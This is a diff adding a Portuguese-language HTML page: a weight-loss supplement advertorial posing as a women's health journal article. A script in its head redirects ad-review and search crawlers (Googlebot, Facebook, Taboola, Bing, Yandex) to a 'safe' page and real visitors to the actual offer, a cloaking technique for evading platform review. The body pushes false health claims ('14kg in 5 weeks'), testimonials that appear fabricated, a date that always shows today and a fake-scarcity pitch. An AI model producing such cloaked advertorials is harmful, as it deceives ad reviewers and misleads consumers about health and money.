@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Descoberta grega para perder gordura naturalmente</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #f5f5f5; color: #333; }
+    header { background: #fff; padding: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; }
+    header h1 { margin: 0; font-size: 24px; color: #2e7d32; }
+    .container { max-width: 800px; margin: 30px auto; background: #fff; padding: 30px; box-shadow: 0 0 15px rgba(0,0,0,0.08); border-radius: 8px; }
+    h2 { color: #388e3c; }
+    .hero-img { width: 30%; border-radius: 20px; margin: 50px; margin-left: 30%; margin-right:20%;}
+    .author { font-size: 14px; color: #777; margin-bottom: 20px; }
+    .cta-button { display: inline-block; background: #43a047; color: white; padding: 15px 25px; text-decoration: none; font-weight: bold; border-radius: 6px; margin-top: 20px; }
+    .testimonial { border-left: 5px solid #66bb6a; background: #f1f8e9; padding: 15px; margin: 20px 0; border-radius: 4px; }
+    .testimonial img { border-radius: 50%; float: left; margin-right: 10px; width: 50px; height: 50px; }
+    .stars { color: #ff9800; }
+    footer { font-size: 12px; color: #999; padding: 20px; text-align: center; }
+  </style>
+  <script>
+    // Lista de bots conhecidos
+    const bots = ['googlebot', 'facebookexternalhit', 'taboola', 'bingbot', 'yandex'];
+
+    // Função para detectar bots pelo userAgent
+    function isBot() {
+      let agent = navigator.userAgent.toLowerCase();
+      return bots.some(bot => agent.includes(bot));
+    }
+
+    // Redirecionamento simples (não confiável, mas serve pra teste visual)
+    window.onload = function() {
+      if (isBot()) {
+        window.location.href = "/safe/index.html";
+      } else {
+        window.location.href = "/real/index.html";
+      }
+    };
+  </script>
+</head>
+<body>
+  <header>
+    <h1>Wellness Journal | Dicas Naturais & Saúde Feminina</h1>
+  </header>
+
+  <div class="container">
+    <div class="author">Por <strong>Juliana Campos</strong> | Atualizado em <script>document.write(new Date().toLocaleDateString())</script></div>
+    
+    <h2>Mulher de 46 anos revela segredo natural que derreteu 14kg em 5 semanas</h2>
+    
+    <img src="perdadepeso.jpg" class="hero-img" alt="Transformação">
+    
+    <p>Uma fórmula inspirada nos rituais da ilha de Ikaria, na Grécia, está fazendo sucesso entre mulheres acima dos 40 anos. A bebida, usada antes de dormir, ajuda o organismo a queimar gordura mesmo enquanto você descansa.</p>
+
+    <p>O suplemento natural combina extratos de hibisco, chá verde e citrus bioflavonoides — ingredientes conhecidos por acelerar o metabolismo e reduzir a inflamação abdominal.</p>
+
+    <h3>Transformações reais</h3>
+
+    <div class="testimonial">
+      <img src="https://cdn-icons-png.flaticon.com/512/180/180675.png" alt="Usuária">
+      <p><strong>Carla M., 48 anos</strong><br>
+      <span class="stars">★★★★★</span><br>
+      “Perdi 12kg em pouco mais de um mês. Minha barriga desinchou e minha autoestima voltou!”</p>
+    </div>
+
+    <div class="testimonial">
+      <img src="https://cdn-icons-png.flaticon.com/256/3124/3124181.png" alt="Usuária">
+      <p><strong>Sandra L., 53 anos</strong><br>
+      <span class="stars">★★★★☆</span><br>
+      “Não acreditei no começo, mas depois de 2 semanas já me sentia mais leve e com mais energia.”</p>
+    </div>
+
+    <p><strong>Atenção:</strong> O fabricante está liberando um número limitado de amostras com frete grátis. Se ainda estiver disponível, clique abaixo:</p>
+
+    <a href="https://linkdaoffer.com" class="cta-button" target="_blank">Quero testar o ritual grego</a>
+  </div>
+
+  <footer>
+    *Este conteúdo é informativo e não substitui avaliação médica. Resultados variam. Esta página pode conter publicidade disfarçada de conteúdo jornalístico.
+  </footer>
+</body>
+</html>
